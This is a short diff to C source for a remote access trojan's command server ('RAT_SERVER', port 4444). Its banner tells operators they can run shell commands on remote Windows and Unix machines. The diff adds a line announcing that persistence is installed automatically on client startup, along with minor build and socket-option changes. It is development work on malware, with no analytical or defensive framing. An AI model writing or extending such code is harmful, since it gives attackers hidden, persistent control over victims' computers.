@@ -1,3 +1,6 @@
+#define _GNU_SOURCE
+#define _POSIX_C_SOURCE 200809L
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,6 +11,7 @@
 #include <sys/wait.h>
 #include <sys/stat.h>
 #include <signal.h>
+#include <sys/time.h>
 
 #define PORT 4444
 #define BUFFER_SIZE 4096
@@ -39,6 +43,7 @@ void print_banner() {
     printf("  All standard OS commands work (ls, pwd, cd, etc.)\n");
     printf("  Windows commands work too (dir, type, etc.)\n");
     printf("  The prompt shows the current OS and directory\n");
+    printf("  Persistence is installed automatically on client startup\n");
     printf("======================================================\n");
 }
 
@@ -52,7 +57,7 @@ int setup_server(RAT_SERVER *server) {
     }
     
     // Set socket options
-    if (setsockopt(server->server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, 
+    if (setsockopt(server->server_fd, SOL_SOCKET, SO_REUSEADDR, 
                    &opt, sizeof(opt))) {
         perror("Setsockopt failed");
         return -1;
